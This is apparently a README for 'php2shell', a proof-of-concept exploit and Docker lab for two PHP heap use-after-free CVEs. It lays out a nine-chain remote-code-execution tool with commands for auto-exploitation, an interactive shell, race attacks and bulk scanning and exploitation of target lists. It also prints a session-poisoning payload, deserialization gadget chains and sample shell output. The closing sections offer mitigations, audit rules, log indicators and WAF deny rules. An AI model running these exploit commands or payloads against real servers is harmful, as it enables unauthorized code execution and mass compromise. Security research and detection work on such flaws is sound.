# php2shell — CVE-2026-109618 / CVE-2026-109619

Proof-of-concept exploit and isolated lab environment for two critical heap use-after-free vulnerabilities in PHP core, collectively known as **php2shell**.

| | CVE-2026-109618 | CVE-2026-109619 |
|---|---|---|
| **Component** | `php_session_rfc1867_callback()` in `ext/session/session.c` | SAPI multipart form-data parser |
| **Bug class** | Heap use-after-free | Heap use-after-free |
| **Trigger** | Multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` field | Any `multipart/form-data` POST |
| **CVSS v4.0** | 9.2 | 9.2 |
| **Auth required** | No | No |

**Affected versions:** PHP 5.4.0 through 8.5.11  
**Patched versions:** 8.2.35, 8.3.36, 8.4.27, 8.5.12 (released 2026-10-21)

> **Legal disclaimer:** This repository is provided for authorized penetration testing, security research, and educational purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws. See [LICENSE](LICENSE).

---

## Table of Contents

- [Background](#background)
- [Technical Analysis](#technical-analysis)
- [9-Chain Architecture](#9-chain-architecture)
- [Repository Structure](#repository-structure)
- [Quick Start](#quick-start)
- [Lab Environment](#lab-environment)
- [Exploit Usage](#exploit-usage)
- [Chain Details](#chain-details)
- [UAF Crash Probe](#uaf-crash-probe)
- [Testing Mitigations](#testing-mitigations)
- [Detection & Indicators](#detection--indicators)
- [References](#references)

---

## Background

On October 20, 2026, details of two critical PHP vulnerabilities leaked ahead of the coordinated disclosure window. The PHP security team released emergency patches the following day at 14:00 UTC. Researchers at watchTowr independently confirmed both vulnerabilities.

The bugs reside in PHP's session upload progress tracking mechanism and the underlying multipart parser. Because `session.upload_progress.enabled` defaults to `On` in PHP's stock configuration, every default PHP installation from version 5.4 onward exposes the attack surface — no application code needs to opt in.

A proof-of-concept tool named "PHP2Shell" was attributed to Calif.IO and leaked alongside the advisory. Sansec predicted mass exploitation within 15 minutes of the patch release.

---

## Technical Analysis

### CVE-2026-109618 — Session Upload Progress UAF

PHP's [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php) feature tracks file upload progress by writing metadata to session files during multipart POST processing. The implementation in `php_session_rfc1867_callback()` stores raw `zval` pointers in live hash tables. Under specific conditions during request processing, these pointers become dangling when the underlying memory is freed but the hash table entry is not invalidated.

**Attack primitive:** An attacker sends a multipart POST containing a `PHP_SESSION_UPLOAD_PROGRESS` field. The field's value — which the attacker fully controls — is written into the session file at a predictable path (`/var/lib/php/sessions/sess_<PHPSESSID>`). The session ID is supplied via cookie, and with `session.use_strict_mode = 0` (default), PHP accepts arbitrary values.

### CVE-2026-109619 — Multipart Parser UAF

A second use-after-free exists in PHP's SAPI-level multipart parser, independent of the session upload progress feature. This bug triggers on any `multipart/form-data` POST and persists even when `session.upload_progress.enabled = Off`. The parser mishandles buffer ownership during part boundary processing, leading to a dangling pointer that can be leveraged for heap corruption.

---

## 9-Chain Architecture

The v5.0 exploit implements **9 independent RCE chains**, each exploiting different conditions. This multi-vector approach maximizes success rate across diverse target configurations.

| Chain | Name | Requirements | LFI Needed | Reliability |
|---|---|---|---|---|
| **1** | Session Poisoning + LFI | `upload_progress=On` + LFI | Yes | High |
| **2** | Deserialization Gadgets | `upload_progress=On` + framework gadget | No | Medium |
| **3** | /proc/self/fd Race | LFI + Linux `/proc` | Yes | Low |
| **4** | phpinfo() Temp File Leak | phpinfo page + LFI | Yes | Medium |
| **5** | Log Poisoning | Readable log files + LFI | Yes | Medium |
| **6** | PEARCMD.php | `pearcmd.php` + `register_argc_argv=On` + LFI | Yes | Medium |
| **7** | /proc/self/environ | Linux `/proc` readable + LFI | Yes | Medium |
| **8** | PHP Wrappers | `allow_url_include=On` + LFI | Yes | High |
| **9** | UAF Disturbance Race | `upload_progress=On` + session pages | Optional | Low |

### Auto-Exploit Flow

```
┌──────────────────┐
│  0. Session Fix  │──► Check if server accepts arbitrary session IDs
└───────┬──────────┘
        ▼
┌──────────────────┐
│   1. Recon       │──► PHP version, OS, session config, phpinfo, allow_url_include
└───────┬──────────┘
        ▼
┌──────────────────┐
│ 2. Framework     │──► Laravel, Symfony, WordPress, Monolog, Guzzle, CodeIgniter, Yii
│    Detection     │
└───────┬──────────┘
        ▼
┌──────────────────┐
│ 3. Chain 2       │──► Deserialization (no LFI needed, tries all gadgets)
│    Deser Try     │
└───────┬──────────┘
        ▼
┌──────────────────┐
│ 4. LFI Scan      │──► 3-phase: Crawl → Alive Check → LFI Test
└───────┬──────────┘
        ▼
┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐
│ Chain 1   │─►│ Chain 9   │─►│ Chain 5   │─►│ Chain 7   │─►│ Chain 6   │
│Session+LFI│  │UAF Disturb│  │Log Poison │  │ environ   │  │ PEARCMD   │
└─────┬────┘  └─────┬────┘  └─────┬────┘  └─────┬────┘  └─────┬────┘
      ▼             ▼             ▼             ▼             ▼
┌──────────┐  ┌──────────┐  ┌──────────┐
│ Chain 8   │─►│ Chain 4   │─►│ Chain 3   │──► Done
│ Wrappers  │  │phpinfo()  │  │/proc/fd   │
└──────────┘  └──────────┘  └──────────┘
```

### Deserialization Gadgets

Chain 2 uses the PHP session serializer pipe `|` delimiter to inject serialized objects. When the progress value contains `|<serialized_object>`, the session handler splits on `|` and deserializes the payload, triggering `__destruct` → RCE.

| Gadget | Framework | Target Versions | Entry Point |
|---|---|---|---|
| **Laravel/RCE1** | Laravel | 5.4+ (PHP 7.x) | PendingBroadcast → Events\Dispatcher |
| **Laravel/RCE2** | Laravel | 5.6-9.x (PHP 7.x) | PendingBroadcast → Bus\Dispatcher |
| **Monolog/RCE** | Monolog | 1.18-2.x | BufferHandler → StreamHandler |
| **Guzzle/Info** | Guzzle | 6.0-6.3.2 | FnStream → _fn_close (detection) |
| **Symfony/RCE** | Symfony | 3.x-5.x | Process → commandline |

---

## Repository Structure

```
php2shell/
├── README.md
├── LICENSE
├── .gitignore
├── Dockerfile                 # Vulnerable PHP 8.4.26 + nginx + php-fpm
├── docker-compose.yml         # Lab orchestration (port 8080)
├── php.ini                    # Vulnerable session configuration
├── nginx.conf                 # FastCGI proxy to php-fpm
├── supervisord.conf           # Process manager for nginx + php-fpm
├── www/
│   ├── index.php              # Configuration verification (phpinfo)
│   ├── upload.php             # Multipart upload endpoint
│   ├── view.php               # Intentional LFI vulnerability
│   ├── debug.php              # Session file inspector
│   └── session.php            # Session-enabled page (Chain 2/9 testing)
├── exploit/
│   ├── php2shell.py           # Main RCE exploit (9-chain, v5.0)
│   ├── uaf_probe.py           # Multipart parser UAF crash probe
│   └── requirements.txt       # Python dependencies
└── scripts/
    └── verify.sh              # Automated lab verification
```

---

## Quick Start

```bash
# Clone the repository
git clone https://github.com/wakemeiflose/php2shell.git
cd php2shell

# Start the vulnerable lab
docker compose up --build -d

# Verify the lab is working
chmod +x scripts/verify.sh
bash scripts/verify.sh

# Run the exploit (all chains)
pip install -r exploit/requirements.txt
python3 exploit/php2shell.py -t http://localhost:8080 -c "id"

# Force a specific chain
python3 exploit/php2shell.py -t http://localhost:8080 --chain 1 -c "id"

# Interactive shell
python3 exploit/php2shell.py -t http://localhost:8080 --shell

# Cleanup
docker compose down
```

---

## Lab Environment

The Docker lab provides a deliberately vulnerable PHP environment:

| Component | Version | Notes |
|---|---|---|
| Ubuntu | 22.04 LTS | Base image |
| PHP | 8.4.26 | Last vulnerable release before 8.4.27 fix |
| nginx | Latest in repo | Reverse proxy to php-fpm |
| PHP-FPM | 8.4.26 | FastCGI process manager |

### Vulnerable Configuration (php.ini)

```ini
session.upload_progress.enabled = On     # Attack surface (default: On)
session.upload_progress.cleanup = Off    # Persist session data after upload
session.use_strict_mode = 0             # Accept arbitrary session IDs (default: 0)
session.use_only_cookies = 0            # Allow session ID from cookies
```

### Web Application

| Endpoint | Purpose |
|---|---|
| `index.php` | Displays PHP version, session configuration, phpinfo |
| `upload.php` | Accepts multipart file uploads (injection target) |
| `view.php?file=` | Intentional LFI — includes any local file (trigger) |
| `debug.php` | Lists session files and their contents for debugging |

---

## Exploit Usage

### Full Auto Mode (Default)

```bash
# Auto scan + exploit using all 9 chains
python3 exploit/php2shell.py -t http://target -c "id"
```

### Chain Selection

```bash
# Force specific chain
python3 exploit/php2shell.py -t http://target --chain 1 -c "id"   # Session Poisoning
python3 exploit/php2shell.py -t http://target --chain 2 -c "id"   # Deserialization
python3 exploit/php2shell.py -t http://target --chain 5 -c "id"   # Log Poisoning
python3 exploit/php2shell.py -t http://target --chain 9 -c "id"   # UAF Disturbance
```

### Interactive Shell

```bash
python3 exploit/php2shell.py -t http://localhost:8080 --shell
```

```
php2shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

php2shell> uname -a
Linux abc123 6.8.0 #1 SMP x86_64 GNU/Linux
```

### LFI Scan Only

```bash
python3 exploit/php2shell.py -t https://target.example.com --scan
python3 exploit/php2shell.py -t https://target.example.com --scan --json
```

### Recon Only

```bash
python3 exploit/php2shell.py -t https://target.example.com --check
```

### Race Condition Mode

When `session.upload_progress.cleanup = On` (default), PHP deletes progress data immediately after upload:

```bash
python3 exploit/php2shell.py -t http://target --race --threads 20 --attempts 500 -c "id"
```

### Batch Execution

```bash
python3 exploit/php2shell.py -t http://target --cmds "id" "whoami" "uname -a"
python3 exploit/php2shell.py -t http://target --cmd-file recon.txt
```

### Manual Mode (Skip Auto-Discovery)

```bash
python3 exploit/php2shell.py -t http://target \
  --inject-endpoint "/upload.php" \
  --lfi-endpoint "/view.php?file=" \
  --session-path "/var/lib/php/sessions" \
  -c "id"
```

### Proxy Support (Burp Suite)

```bash
python3 exploit/php2shell.py -t http://target -c "id" --proxy http://127.0.0.1:8081
```

### Bulk Scan Mode

Scan multiple targets from a file. Outputs JSONL with per-target verdicts:

```bash
# Create target list
echo -e "http://target1\nhttp://target2\nhttp://target3" > urls.txt

# Scan all targets (check only, no RCE)
python3 exploit/php2shell.py --targets urls.txt

# Scan and attempt exploitation
python3 exploit/php2shell.py --targets urls.txt -c "id" -o results.jsonl
```

Verdicts: `unreachable`, `no_vector`, `session_fixation`, `armed`, `armed_no_rce`, `rce_hit`, `error`

---

## Chain Details

### Chain 1 — Session Poisoning + LFI

The classic php2shell chain. Injects PHP code via `PHP_SESSION_UPLOAD_PROGRESS` into a session file, then includes it via a file inclusion vulnerability.

```
Attacker → POST multipart (PHP_SESSION_UPLOAD_PROGRESS = "<?php system();?>")
         → Session file written: /var/lib/php/sessions/sess_<SID>
         → GET /vuln.php?file=/var/lib/php/sessions/sess_<SID>
         → PHP includes session file → code executes → RCE
```

**Requirements:** `upload_progress.enabled=On`, LFI vulnerability, known session path.

### Chain 2 — Deserialization Gadgets

Exploits PHP's session serializer pipe `|` delimiter. Injects a serialized gadget object as the upload progress value. When another page calls `session_start()`, PHP deserializes the object and triggers `__destruct()` → RCE.

**No LFI needed.** Requires a framework with an exploitable gadget class (Laravel, Symfony, Monolog, Guzzle).

### Chain 3 — /proc/self/fd Temp File Race

Uploads a large file with embedded PHP payload and races to include the temp file via `/proc/self/fd/N` before PHP cleans up. File descriptors 3-29 are brute-forced.

**Requirements:** LFI + Linux with readable `/proc`.

### Chain 4 — phpinfo() Temp File Leak

Uses the Insomnia Security technique: uploads a file to a phpinfo() page, parses the streaming response for the `tmp_name` value, and races to include the temp file via LFI before cleanup.

**Requirements:** Accessible phpinfo() page + LFI.

### Chain 5 — Log Poisoning

Injects PHP code into the `User-Agent` header, which gets written to web server access/error logs. Then includes the log file via LFI to execute the payload.

**Tested log paths:** Apache, nginx, httpd access/error logs, auth.log, mail, vsftpd, sshd, `/proc/self/fd/2,7`.

### Chain 6 — PEARCMD.php

Exploits `pearcmd.php` (present in official Docker PHP images) to write a webshell via `config-create` or `man_dir` methods. Then includes the webshell via LFI.

**Requirements:** `register_argc_argv=On` + accessible pearcmd.php + LFI.

### Chain 7 — /proc/self/environ

Injects PHP code via `User-Agent` header and includes `/proc/self/environ` via LFI. The environ file contains `HTTP_USER_AGENT` with the payload.

**Requirements:** Linux with `/proc/self/environ` readable via LFI.

### Chain 8 — PHP Wrappers

Uses `php://input` or `data://` wrappers for direct code execution through the LFI vulnerability. Sends the PHP payload in the POST body or as a base64-encoded data URI.

**Requirements:** `allow_url_include=On` + LFI.

### Chain 9 — UAF Disturbance Race

Exploits the core CVE-2026-109618 mechanism directly: sends throttled multipart uploads to keep `session.upload_progress` active while concurrent requests disturb the session via destroy, regenerate, or garbage collection. This races against the session handler to trigger the heap UAF on dangling `zval` pointers.

```
Thread A: POST multipart (throttled upload, keeps progress tracking active)
Thread B: GET ?action=destroy  (frees session HashTable while A holds pointers)
Thread C: GET ?action=regenerate (reallocates session storage)
Thread D: GET ?action=gc (forces garbage collection)
    → zval pointers in progress HashTable become dangling → UAF → crash/RCE
```

Three disturbance modes are tried sequentially:
- **destroy** — concurrent `session_destroy()` frees the session HashTable
- **regenerate** — `session_regenerate_id()` reallocates session storage
- **gc** — force session garbage collection with low `gc_maxlifetime`

Technique sourced from `slabbdev/php2shell` race harness and `ikow/php2shell-poc` chain analysis.

**Requirements:** `upload_progress=On` + session-enabled pages. LFI optional (used for post-crash payload delivery).

---

## UAF Crash Probe

`uaf_probe.py` sends malformed multipart payloads to detect the CVE-2026-109619 parser vulnerability. It does not achieve code execution — it identifies vulnerable targets through crash behavior.

```bash
python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php
python3 exploit/uaf_probe.py -t http://target --variant nested longheader --repeat 5 -v
```

### Probe Variants

| Variant | Description |
|---|---|
| `nested` | Double-close boundary — triggers cleanup on already-freed buffer |
| `longheader` | 8KB+ Content-Disposition/Content-Type — stresses allocation |
| `nullbyte` | Null bytes in body — corrupts C string length calculations |
| `truncated` | Missing closing boundary — unexpected EOF during part read |
| `interleaved` | Mixed boundaries from different containers — confuses state machine |

---

## Testing Mitigations

### Disable upload_progress (partial mitigation)

```bash
docker exec php2shell-lab sed -i \
  's/upload_progress.enabled = On/upload_progress.enabled = Off/' \
  /etc/php/8.4/fpm/php.ini
docker exec php2shell-lab killall -USR2 php-fpm8.4
```

> **Note:** Disabling `session.upload_progress` only blocks CVE-2026-109618. The multipart parser UAF (CVE-2026-109619) remains exploitable. Patching PHP is the only complete remediation.

### Enable strict mode

```bash
docker exec php2shell-lab sed -i \
  's/use_strict_mode = 0/use_strict_mode = 1/' \
  /etc/php/8.4/fpm/php.ini
docker exec php2shell-lab killall -USR2 php-fpm8.4
```

---

## Detection & Indicators

### Process Monitoring

```bash
auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -d, php-fpm) -k php2shell
```

### Log Indicators

- POST requests with `PHP_SESSION_UPLOAD_PROGRESS` in the body
- Sequential POST then GET to different endpoints with the same session cookie
- Session files containing `<?php` tags
- Unusual User-Agent strings containing PHP code
- Requests to pearcmd.php paths or /proc/ paths
- Rapid concurrent requests with identical PHPSESSID (UAF disturbance pattern)
- HTTP 502/503 after multipart POST (FPM worker crash from UAF)

```bash
grep -rl '<?php' /var/lib/php/sessions/
```

### WAF Rules (ModSecurity)

```
SecRule ARGS:PHP_SESSION_UPLOAD_PROGRESS "@contains <?php" \
  "id:2026109618,phase:2,deny,status:403,msg:'php2shell session poison'"

SecRule REQUEST_HEADERS:User-Agent "@contains <?php" \
  "id:2026109619,phase:1,deny,status:403,msg:'php2shell log poison'"
```

---

## References

- [Sansec — Critical PHP RCE: php2shell](https://sansec.io/research/php2shell)
- [watchTowr — PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [Huntress — php2shell Analysis](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities)
- [Brandefense — php2shell Blog](https://brandefense.io/blog/php2shell-php-rce-cve-2026-109618-109619/)
- [SocRadar — CVE-2026-109618 & 109619](https://socradar.io/blog/php2shell-cve-2026-109618-cve-2026-109619/)
- [SecurityWeek — Mass Exploitation Looms](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
- [ikow/php2shell-poc — 5-chain Analysis & PoC](https://github.com/ikow/php2shell-poc)
- [murrez/php2shell — Smart 618 scoring & session fixation](https://github.com/murrez/php2shell)
- [slabbdev/php2shell — Race harness & disturbance modes](https://github.com/slabbdev/php2shell-cve-2026-109618-109619)
- [0x4148/CVE-2026-109618 — FPM stall PoC](https://github.com/0x4148/CVE-2026-109618-php2shell-lab)
- [Is4yev/php2shell-poc — Crash framework](https://github.com/Is4yev/php2shell-poc)
- [eness/php2shell-PoC — zval pointer analysis & WAF rules](https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC)
- [HackTricks — LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS](https://hacktricks.wiki/en/pentesting-web/file-inclusion/via-php_session_upload_progress.html)
- [PayloadsAllTheThings — LFI to RCE](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/LFI-to-RCE/)
- [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)
- [Check Point — php2shell Analysis](https://blog.checkpoint.com/security/php2shell-what-we-know-about-the-leaked-critical-php-vulnerabilities-cve-2026-109618-cve-2026-109619)
- [Ox Security — Two PHP RCE Vulnerabilities](https://www.ox.security/blog/cve-2026-109618-cve-2026-109619-two-vulnerabilities-allow-unauthenticated-rce-in-php/)
- [PHP Manual — Session Upload Progress](https://www.php.net/manual/en/session.upload-progress.php)
